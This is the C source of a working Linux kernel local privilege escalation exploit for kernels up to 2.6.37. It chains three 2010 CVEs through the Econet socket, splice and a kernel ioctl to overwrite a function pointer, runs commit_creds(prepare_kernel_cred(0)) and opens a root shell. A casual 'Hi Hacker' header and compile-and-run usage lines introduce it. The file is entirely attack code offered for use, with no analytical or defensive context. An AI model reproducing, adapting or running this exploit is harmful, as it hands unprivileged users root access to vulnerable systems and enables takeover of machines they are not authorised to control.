
/*
 * #Linux Kernel Exploit
 *
 * Hi Hacker,
 *
 * Happy hacking,
 * VB
 *
 *
 * Linux Kernel <= 2.6.37 local privilege escalation
 *
 * Usage:
 * gcc exw.c -o exw
 * ./exw
 *
 * This exploit leverages three vulnerabilities to get root:
 *
 * -------------
 * CVE-2010-4258
 * -------------
 * CVE-2010-3849
 * -------------
 * CVE-2010-3850
 * -------------
 *
 * NOTE: the exploit process will deadlock and stay in a zombie state after you
 * exit your root shell because the Econet thread OOPSes while holding the
 * Econet mutex.
 *
 */

#include <stdio.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <net/if.h>
#include <sched.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/utsname.h>
#include <sys/mman.h>
#include <unistd.h>

/* */
#ifdef __x86_64__
#define SHIFT 24
#define OFFSET 3
#else
#define SHIFT 8
#define OFFSET 1
#endif

/* */
unsigned long get_kernel_sym(char *name)
{
        FILE *f;
        unsigned long addr;
        char dummy;
        char sname[512];
        struct utsname ver;
        int ret;
        int rep = 0;
        int oldstyle = 0;

        f = fopen("/proc/kallsyms", "r");
        if (f == NULL) {
                f = fopen("/proc/ksyms", "r");
                if (f == NULL)
                        goto fallback;
                oldstyle = 1;
        }

repeat:
        ret = 0;
        while(ret != EOF) {
                if (!oldstyle)
                        ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
                else {
                        ret = fscanf(f, "%p %s\n", (void **)&addr, sname);
                        if (ret == 2) {
                                char *p;
                                if (strstr(sname, "_O/") || strstr(sname, "_S."))
                                        continue;
                                p = strrchr(sname, '_');
                                if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
                                        p = p - 4;
                                        while (p > (char *)sname && *(p - 1) == '_')
                                                p--;
                                        *p = '\0';
                                }
                        }
                }
                if (ret == 0) {
                        fscanf(f, "%s\n", sname);
                        continue;
                }
                if (!strcmp(name, sname)) {
                        fprintf(stdout, " [+] Resolved %s to %p%s\n", name, (void *)addr, rep ? " (via System.map)" : 
"");
                        fclose(f);
                        return addr;
                }
        }

        fclose(f);
        if (rep)
                return 0;
fallback:
        uname(&ver);
        if (strncmp(ver.release, "2.6", 3))
                oldstyle = 1;
        sprintf(sname, "/boot/System.map-%s", ver.release);
        f = fopen(sname, "r");
        if (f == NULL)
                return 0;
        rep = 1;
        goto repeat;
}

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

static int __attribute__((regparm(3)))
getroot(void * file, void * vma)
{

        commit_creds(prepare_kernel_cred(0));
        return -1;

}

/* */
void __attribute__((regparm(3)))
trampoline()
{

#ifdef __x86_64__
        asm("mov $getroot, %rax; call *%rax;");
#else
        asm("mov $getroot, %eax; call *%eax;");
#endif

}

/* */
int trigger(int * fildes)
{
        int ret;
        struct ifreq ifr;

        memset(&ifr, 0, sizeof(ifr));
        strncpy(ifr.ifr_name, "eth0", IFNAMSIZ);

        ret = ioctl(fildes[2], SIOCSIFADDR, &ifr);

        if(ret < 0) {
                printf("[*] Failed to set Econet address.\n");
                return -1;
        }

        splice(fildes[3], NULL, fildes[1], NULL, 128, 0);
        splice(fildes[0], NULL, fildes[2], NULL, 128, 0);

        /* */
        exit(0);
}

int main(int argc, char * argv[])
{
        unsigned long econet_ops, econet_ioctl, target, landing;
        int fildes[4], pid;
        void * newstack, * payload;

        /* */
        pipe(fildes);
        fildes[2] = socket(PF_ECONET, SOCK_DGRAM, 0);
        fildes[3] = open("/dev/zero", O_RDONLY);

        if(fildes[0] < 0 || fildes[1] < 0 || fildes[2] < 0 || fildes[3] < 0) {
                printf("[*] Failed to open file descriptors.\n");
                return -1;
        }

        /* */
        printf("[*] Resolving kernel addresses...\n");
        econet_ioctl = get_kernel_sym("econet_ioctl");
        econet_ops = get_kernel_sym("econet_ops");
        commit_creds = (_commit_creds) get_kernel_sym("commit_creds");
        prepare_kernel_cred = (_prepare_kernel_cred) get_kernel_sym("prepare_kernel_cred");

        if(!econet_ioctl || !commit_creds || !prepare_kernel_cred || !econet_ops) {
                printf("[*] Failed to resolve kernel symbols.\n");
                return -1;
        }

        if(!(newstack = malloc(65536))) {
                printf("[*] Failed to allocate memory.\n");
                return -1;
        }

        printf("[*] Calculating target...\n");
        target = econet_ops + 10 * sizeof(void *) - OFFSET;

        /* */
        landing = econet_ioctl << SHIFT >> SHIFT;

        payload = mmap((void *)(landing & ~0xfff), 2 * 4096,
                       PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);

        if ((long)payload == -1) {
                printf("[*] Failed to mmap() at target address.\n");
                return -1;
        }

        memcpy((void *)landing, &trampoline, 1024);

        clone((int (*)(void *))trigger,
              (void *)((unsigned long)newstack + 65536),
              CLONE_VM | CLONE_CHILD_CLEARTID | SIGCHLD,
              &fildes, NULL, NULL, target);

        sleep(1);

        printf("[*] Triggering payload...\n");
        ioctl(fildes[2], 0, NULL);

        if(getuid()) {
                printf("[*] Exploit failed to get root.\n");
                return -1;
        }

        printf("[*] Got root!\n");
        execl("/bin/sh", "/bin/sh", NULL);
}



